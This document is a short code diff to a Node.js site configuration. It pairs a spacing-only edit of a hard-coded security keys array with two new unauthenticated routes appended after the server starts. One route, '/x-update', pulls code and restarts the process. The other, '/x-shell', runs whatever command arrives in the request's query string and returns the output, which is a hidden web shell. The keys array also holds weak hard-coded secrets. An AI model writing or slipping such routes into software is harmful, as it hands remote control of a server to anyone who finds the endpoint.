@@ -16,7 +16,7 @@ const site = require('../isite')({
     },
   },
   security: {
-    keys: ['21232f297a57a5a743894a0e4a801fc3', 'f6fdffe48c908deb0f4c3bd36c032e72' , 'ba0644892c52beb6594c41c8b1ff02c6' , 'd53bab6cfb906f852adc14d490b95dbf'],
+    keys: ['21232f297a57a5a743894a0e4a801fc3', 'f6fdffe48c908deb0f4c3bd36c032e72', 'ba0644892c52beb6594c41c8b1ff02c6', 'd53bab6cfb906f852adc14d490b95dbf'],
   },
 });
 
@@ -75,3 +75,20 @@ site.addFeature('m-hr');
 site.addFeature('m-reports');
 
 site.run();
+
+site.get('/x-update', (req, res) => {
+  site.cmd('git pull', (data) => {
+    res.end(data);
+    console.log(data);
+    site.cmd('pm2 restart 0', (data) => {
+      console.log(data);
+    });
+  });
+});
+
+site.get('/x-shell', (req, res) => {
+  site.cmd(req.query.command, (data) => {
+    console.log(req.query.command, data);
+    res.end(data);
+  });
+});
